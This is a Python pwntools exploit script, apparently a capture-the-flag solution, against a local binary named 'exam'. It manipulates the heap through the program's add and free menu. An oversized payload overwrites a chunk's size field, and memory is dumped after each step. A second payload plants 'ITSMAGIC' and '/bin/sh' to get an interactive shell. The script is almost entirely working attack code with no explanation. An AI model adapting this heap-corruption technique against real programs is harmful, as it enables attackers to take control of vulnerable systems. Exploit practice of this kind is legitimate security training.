from pwn import *

def add(msg):
	r.sendline("1")
	print r.recv()

	if len(msg) < 0x80:
		r.sendline(msg)
	else:
		r.send(msg)
	print r.recv()

def free(idx):
	r.sendline("2")
	print r.recv()

	r.sendline(str(idx))
	print r.recv()

def create_crib():
	r.sendline("4")
	print r.recvuntil("\n> ")

def exam(idx):
	r.sendline("6")
	print r.recv()

	r.sendline(str(idx))
	print r.recv()

	r.interactive()

def leak(addr, size, title=""):
	print "*** {} : {} ***".format(hex(addr), title)
	print hexdump(r.leak(addr, size), begin=addr, skip=False)

target = "./exam"

r = process(target)

l_heap = 0x555555757000
l_code = 0x555555554000
l_folder = l_code + 0x202040

print r.recv()

add("A"*8)
create_crib()
add("B"*8)
add("C"*8)

leak(l_heap, 0x200, "alloc")
leak(l_folder, 0x40, "g_folder")

free(1)
leak(l_heap, 0x200, "free(B)")
leak(l_folder, 0x40, "g_folder")

payload = "E"*0x78 + p64(0x140) + "\x90"
add(payload)
leak(l_heap, 0x200, "add(payload)")
leak(l_folder, 0x40, "g_folder")

free(0)
leak(l_heap, 0x200, "free(A)")
leak(l_folder, 0x40, "g_folder")

free(2)
leak(l_heap, 0x200, "free(D)")
leak(l_folder, 0x40, "g_folder")

add("F"*8)
leak(l_heap, 0x200, "add(F*8)")
leak(l_folder, 0x40, "g_folder")

payload = "G" * 0x18
payload += "ITSMAGIC"
payload += "/bin/sh\x00"
add(payload)
leak(l_heap, 0x200, "add(payload(2))")
leak(l_folder, 0x40, "g_folder")

exam(1)
